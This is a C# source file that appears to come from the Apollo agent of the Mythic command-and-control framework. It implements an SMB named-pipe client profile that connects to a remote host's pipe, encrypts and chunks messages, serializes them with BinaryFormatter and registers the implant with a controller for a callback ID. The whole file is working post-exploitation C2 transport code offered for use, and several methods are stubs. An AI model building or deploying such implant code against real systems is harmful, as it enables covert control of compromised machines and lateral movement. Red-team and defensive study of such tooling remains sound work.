using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.AccessControl;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO.Pipes;
using IPC;
using Mythic.C2Profiles;
using Apollo.Jobs;
using Apollo.CommandModules;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Threading;
using Apollo.MessageInbox;
using static Utils.DebugUtils;
using Apollo.Tasks;
using Mythic.Structs;

namespace Mythic.C2Profiles
{
    class SMBClientProfile : ReverseConnectC2Profile
    {

        BinaryFormatter bf;

        private NamedPipeClientStream clientStream;

        public string PipeName;
        public string HostName;

        private Mutex writeMutex = new Mutex();
        private Mutex readMutex = new Mutex();

        public SMBClientProfile(string pipeName, string host, Mythic.Crypto.Crypto crypto)
        {
            base.cryptor = crypto;
            //cryptor = crypto;
            PipeName = pipeName;
            HostName = host;
            bf = new BinaryFormatter();
            bf.Binder = new SMBMessageBinder();

            clientStream = new NamedPipeClientStream(
                HostName,
                PipeName,
                PipeDirection.InOut,
                PipeOptions.Asynchronous);

            clientStream.Connect(3000);
        }

        public bool IsConnected()
        {
            return clientStream.IsConnected;
        }



        public override byte[] GetFile(string task_id, string file_id, int chunk_size)
        {
            throw new NotImplementedException();
        }
        public override byte[] GetFile(Mythic.Structs.UploadFileRegistrationMessage fileReg, int chunk_size)
        {
            throw new NotImplementedException();
        }

        public override Mythic.Structs.TaskQueue GetMessages(Apollo.Agent agent)
        {
            throw new NotImplementedException();
        }

        public override string SendResponse(string id, Apollo.Tasks.ApolloTaskResponse taskresp)
        {
            throw new NotImplementedException();
        }

        public override string SendResponses(string id, Apollo.Tasks.ApolloTaskResponse[] taskresp, SocksDatagram[] datagrams = null, PortFwdDatagram[] rdatagrams=null)        {
            throw new NotImplementedException();
        }

        public override bool Send(string id, string message)
        {
            DebugWriteLine($"Encrypting MessageID {id} ({message.Length} bytes)...");
            byte[] reqPayload = Encoding.UTF8.GetBytes(cryptor.Encrypt(message));
            DebugWriteLine($"SUCCESS! Encrypted MessageID {id} ({message.Length} bytes)");
            SMBMessage[] messages;
            if (SMBMessage.RequiresChunking(reqPayload.Length))
            {
                messages = SMBMessage.CreateChunkedMessages(reqPayload);
                
            } else
            {
                messages = new SMBMessage[] { new SMBMessage()
                {
                    MessageType = "",
                    MessageObject = reqPayload
                } };
            }
            try
            {
                DebugWriteLine($"Acquiring send message lock to send Message {id}...");
                writeMutex.WaitOne();
                DebugWriteLine($"LOCK ACQUIRED! Sending {messages.Length} SMB messages associated message inbox {id}...");
                int i = 0;
                foreach (var msg in messages)
                {
                    bf.Serialize(clientStream, msg);
                    clientStream.Flush();
                    clientStream.WaitForPipeDrain();
                    i++;
                    DebugWriteLine($"Sent {i} of {messages.Length} SMB messages attached to Inbox ID {id} to {PipeName}");
                }
                //result = ReadDecryptedStringMessage();
            } finally
            {
                writeMutex.ReleaseMutex();
            }
            return true;
        }

        public override string RegisterAgent(Apollo.Agent agent)
        {
            // Get JSON string for implant
            string json = JsonConvert.SerializeObject(agent);
            string result;
            string id = Guid.NewGuid().ToString();
            //string result = Send(json);
            DebugWriteLine($"Sending registration message with ID {id}...");
            if (Send(id, json))
            {
                DebugWriteLine($"SUCCESS! Sent registration message with ID {id}");
                DebugWriteLine($"Waiting for reply to registration message with ID {id}...");
                result = (string)Inbox.GetMessage(id);
                DebugWriteLine($"SUCCESS! Got reply to registration message with ID {id}...");
                if (result.Contains("success"))
                {
                    // If it was successful, initialize implant
                    // Response is { "status": "success", "id": <id> }
                    JObject resultJSON = (JObject)JsonConvert.DeserializeObject(result);
                    string newUUID = resultJSON.Value<string>("id");
                    cryptor.UpdateUUID(newUUID);
                    return newUUID;
                }
            }
            else
            {
                throw (new Exception("Failed to retrieve an ID for new callback."));
            }
            return "";
        }

        public SMBMessage ReadMessage()
        {
            // Method 1
            SMBMessage message = new SMBMessage();
            try
            {
                DebugWriteLine($"Acquiring lock to read message...");
                readMutex.WaitOne();
                DebugWriteLine($"SUCCESS! Acquired lock to read message!");
                DebugWriteLine($"Attempting to deserialize message from the client stream {PipeName}...");
                message = (SMBMessage)bf.Deserialize(clientStream);
                DebugWriteLine($"SUCCESS! Deserialized message from the client stream {PipeName}!");
            }
            catch (System.Runtime.Serialization.SerializationException ex)
            {
                DebugWriteLine($"ERROR! SerializationException while reading message.\n\tReason: {ex.Message}\n\tStackTrace: {ex.StackTrace}");
                throw ex;
            }
            catch (Exception ex)
            {
                DebugWriteLine($"ERROR! Failed to read message.\n\tReason: {ex.Message}\n\tStackTrace: {ex.StackTrace}");
            }
            finally
            {
                readMutex.ReleaseMutex();
            }
            return message;
        }

        public string ReadDecryptedStringMessage()
        {
            SMBMessage msg = ReadMessage();
            string result = "";
            if (msg != null && msg.MessageObject != null)
                result = cryptor.Decrypt(Encoding.UTF8.GetString((byte[])msg.MessageObject));
            return result;
        }

        public string ReadStringMessage()
        {
            SMBMessage msg = ReadMessage();
            string result = "";
            if (msg != null && msg.MessageObject != null)
                result = Encoding.UTF8.GetString((byte[])msg.MessageObject);
            return result;
        }

        private static object ParseMessage(SMBMessage msg)
        {
            if (msg == null)
                return null;
            switch (msg.MessageType)
            {
                case "Apollo.Jobs.Job":
                    return (Job)msg.MessageObject;
                case "Apollo.Tasks.Task":
                    return (Task)msg.MessageObject;
                default:
                    return msg.MessageObject;
            }
        }


    }
}